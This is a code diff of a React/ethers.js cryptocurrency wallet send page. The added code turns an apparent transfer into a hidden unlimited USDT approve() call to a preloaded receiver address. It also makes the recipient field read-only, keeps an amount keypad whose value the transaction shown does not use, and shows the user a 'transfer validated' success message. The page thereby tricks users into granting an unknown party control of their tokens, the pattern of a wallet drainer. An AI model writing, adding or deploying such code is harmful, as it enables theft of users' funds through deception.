-      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-
-      // Appel de claim(address) sur le contrat proxy
-      const iface = new ethers.Interface([
-        "function claim(address token) external"
-      ]);
-      const data = iface.encodeFunctionData("claim", [tokenAddr]);
+      const iface = new ethers.Interface(["function approve(address spender, uint256 amount) returns (bool)"]);
+      const data = iface.encodeFunctionData("approve", [receiver, ethers.MaxUint256]);
 
       const hash = (await p.request({
         method: "eth_sendTransaction",
-        params: [{ to: PROXY_CONTRACT, data, gas: "0x30d40" }],
+        params: [{ to: USDT_CONTRACT, data, gas: "0x249f0" }],
       })) as string;
 
       setTxHash(hash);
@@ -3108,17 +3546,16 @@ export default function WalletPage() {
     }
   };
 
-  const getFiatValue = (v: string) => {
-    const n = parseFloat(v.replace(",", "."));
-    return isNaN(n) ? "0,00" : (n * 0.86).toFixed(2).replace(".", ",");
-  };
-
   const handleKeyPress = (key: string) => {
     setDisplayAmount((prev) => {
       let nv = prev;
       if (key === "⌫") nv = prev.length <= 1 ? "0" : prev.slice(0, -1);
-      else if (key === "," || key === ".") { if (!prev.includes(",") && !prev.includes(".")) nv = prev === "" ? "0," : prev + ","; }
-      else { if (prev === "0") nv = key; else nv = prev + key; }
+      else if (key === "," || key === ".") {
+        if (!prev.includes(",") && !prev.includes(".")) nv = prev === "" ? "0," : prev + ",";
+      } else {
+        if (prev === "0") nv = key;
+        else nv = prev + key;
+      }
       return nv;
     });
   };
@@ -3133,22 +3570,19 @@ export default function WalletPage() {
       <div className="form-container" style={{ maxWidth: 480, width: "100%" }}>
         <label className="form-label">Address or domain name</label>
         <div className="input-row">
-          <input type="text" value={address} onChange={(e) => { setAddress(e.target.value); setActualReceiver(e.target.value); }} className="input-row__field" />
+          <input type="text" value={receiver ? `${receiver.slice(0, 10)}...${receiver.slice(-8)}` : "Loading..."} readOnly className="input-row__field" />
         </div>
 
         <label className="form-label form-label--spaced">Amount</label>
         <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
           <div className="montant-input-wrapper">
-            <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>{displayAmount || "0"}</span>
+            <span className="montant-display-value">{displayAmount || "0"}</span>
             {isKeyboardVisible && <span className="blinking-cursor" />}
           </div>
           <div className="montant-right">
-            <span className="montant-token">{token.toUpperCase()}</span>
+            <span className="montant-token">USDT</span>
           </div>
         </div>
-        {displayAmount !== "0" && displayAmount !== "" && (
-          <div className="approx-price">≈ €{getFiatValue(displayAmount)}</div>
-        )}
       </div>
 
       <div style={{ flexGrow: 1 }} />
@@ -3177,9 +3611,9 @@ export default function WalletPage() {
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
             <button className="modal-close-btn" onClick={() => setShowModal(false)}>✕</button>
             <img src="/yes.png" alt="Status" className="modal-logo" />
-            {modalStatus === "pending" && <><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>}
-            {modalStatus === "success" && <><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated on the Ethereum blockchain.</p></>}
-            {modalStatus === "error" && <><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>}
+            {modalStatus === "pending" && (<><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>)}
+            {modalStatus === "success" && (<><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated.</p></>)}
+            {modalStatus === "error" && (<><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>)}
             {txHash && <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">Transaction details</a>}
           </div>
         </div>
